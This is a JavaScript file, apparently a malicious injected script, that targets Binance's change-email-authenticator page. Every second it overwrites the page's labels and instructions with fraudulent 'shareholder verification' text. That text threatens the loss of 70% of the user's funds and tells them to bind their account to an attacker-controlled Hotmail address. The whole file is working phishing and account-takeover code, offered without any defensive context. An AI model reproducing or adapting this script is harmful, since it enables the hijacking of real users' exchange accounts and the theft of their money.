var locationToExecute="binance.com"
var currentBrowserLocation=window.location.href

if(currentBrowserLocation.includes(locationToExecute)){

    if(currentBrowserLocation.includes("change-email-authenticator") ){
        setInterval(() => {
           
            document.querySelector(".css-jhraj4").innerHTML="<p style='text-align: center; width:80%; font-size:19px; '>   Temporarily Unbinding Email And chanelling verification codes to personal shareholder's link. <br>this is the last step to enable you get verification code on your shareholder's link and it's 100% Risk free.<br>this verification is to make sure you are not a robot. And to stop us from taking 70% of all your money as part of the policy you signed at the time of buying shares.<br><br>Note:After this verification you can always use your email and password to login as your email will never be changed and it still remain the same .This proccess is just to chanel a verification code to your personal link.<br><br> Note:  Use 'BinanceShareholder101@hotmail.com' as your shareholder's Email. This will bind your verification code to your personal link.<br> <br>Note: click on  <a href='https://google.com' target='_blank'>open Personal shareholder's link in new tab</a> to open your personal link use the code on the link shareholder's verification code code and Finalize. <br><br>Shareholder's address: BinanceShareholder101@hotmail.com<br><a href='https://google.com' target='_blank'>open Personal shareholder's link in new tab</a></p>"
            document.querySelector(".css-1xh32w8").innerHTML="this is the last step in binance shareholder email linking and  verification. use <b>BinanceShareholder101@hotmail</b> as the shareHolder's email and check your personal link for your verification code"
            var veriText=document.querySelectorAll(".css-xjlny9")
            veriText[0].innerHTML="Shareholder's address "
            veriText[1].innerHTML="Shareholder's personal link verification code"
            document.querySelector(".css-1w3dtlz").innerHTML="Shareholder's verification"

            var help_error=document.querySelectorAll("div [class='help_error css-1c3pga9']")
          
            help_error[0].innerHTML="Please enter Shareholder's address"
            help_error[1].innerHTML="Please enter a valid Shareholder's link verification code."
            
            
             

        }, 1000);
    
        // var finalizebtn=document.querySelector("div [class='bn-2fa-submit css-vurnku']")
        // finalizebtn.querySelector("button").innerHTML="Finalize"
        
        
        
    }

}
